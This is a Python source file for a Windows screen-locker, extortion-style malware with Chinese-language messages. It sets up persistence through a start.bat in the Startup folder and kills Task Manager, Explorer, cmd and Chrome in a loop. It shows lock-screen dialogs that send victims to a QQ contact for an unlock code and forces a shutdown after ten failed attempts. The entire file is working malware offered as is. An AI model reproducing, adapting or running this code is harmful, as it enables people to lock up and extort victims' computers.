import subprocess,time,sys,random,hashlib,os,ctypes
import threading
import easygui as gui
RADM = random.randint(1,99999999)
KEYSTR = str(RADM)
KEY_A = "您的公钥为：" + KEYSTR
KEYHEX = str(KEYSTR.encode().hex())
HEXMD5 = hashlib.md5(KEYHEX.encode(encoding='UTF-8')).hexdigest()
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW


path111 = sys.argv[0]
str(path111)
fileName='C:/system64.dll'
with open(fileName,'w')as file:
        file.write('1')

fileCarName='C:/system32.dll'
with open(fileCarName,'w')as file12:
        file12.write('1')

with open(file="C:/system32.dll", mode="r", encoding="utf-8") as fp:
    aaaaa = fp.read()
    #intaaaaa = int(aaaaa)
if aaaaa == "0":
    sys.exit(0)
else:
    fileStopName='C:/system32.dll'
    with open(fileStopName,'w')as file1:
            file1.write('1')


fileName1='C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/start.bat'
with open(fileName1,'w')as file2:
        file2.write(path111)


def unKill():
  while True:
    with open(file="C:/system64.dll", mode="r", encoding="utf-8") as f:
      a = f.read()  # 读取判断运行防杀程序数据库
    a = int(a)
    if a == 1:
      subprocess.call("taskkill /F /IM Taskmgr.exe", startupinfo=si) #注意，本代码为破坏性代码！
      subprocess.call("taskkill /F /IM explorer.exe", startupinfo=si)
      subprocess.call("taskkill /F /IM cmd.exe", startupinfo=si)
      subprocess.call("taskkill /F /IM chrome.exe", startupinfo=si)
      time.sleep(0.5)
      print(1)
    elif a == 0:
      subprocess.call("C:/Windows/explorer.exe", startupinfo=si)
      sys.exit(0)

def mainProgram():
  FRE = 10
  gui.msgbox("                          警告，您的电脑目前已被锁机！"
             "                                                    警告，您的电脑目前已被锁机！"
             "                                                    警告，您的电脑目前已被锁机！","警告！","继续")
  gui.buttonbox("                    您的电脑目前已经无法正常使用，请不要重启！", "警告！", ["我已知晓"])
  while True:
      key = gui.enterbox("请前往QQ：2738549065获取解锁码!",KEY_A,"解锁码放在这里!")
      strback = str(key)
      if strback == HEXMD5:
          gui.msgbox("恭喜，您的电脑已经成功解锁","恭喜","查看温馨提示")
          gui.msgbox("程序即刻失效,请重启电脑","恭喜","继续")
          os.system("C:/Windows/explorer.exe")
          fileStop2Name = "C:/system.dll"
          with open(fileStop2Name, 'w') as file233:
              file233.write('0')
          with open(fileName, 'w') as file456:
              file456.write('0')
          os.remove("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/start.bat")
          sys.exit(0)
      else:
          if FRE != 0:
            FRE = FRE - 1
            AAA = "你还剩余" + str(FRE) + "次机会"
            gui.msgbox("你这解锁码不对劲啊！","警告！","继续")
            gui.msgbox("切勿反复输入错误解锁码",AAA,"继续")
          if FRE == 0:
            os.system("shutdown -s -t 30")
            while True:
                gui.msgbox("不好意思，你机会用光了！电脑即将关机！", "严重警告！", " ")
thread1 = threading.Thread(target=unKill,daemon=True)
exits = os.path.isfile("test-data")
if exits == True:
    with open(file="C:/system.dll", mode="r", encoding="utf-8") as fe:
        aaaa = fe.read()
elif exits == False:
    aaaa = "1"
if exits == True:
    if aaaa == "0":
        sys.exit(0)
    else:
        pass
else:
    thread1.start()
    mainProgram()





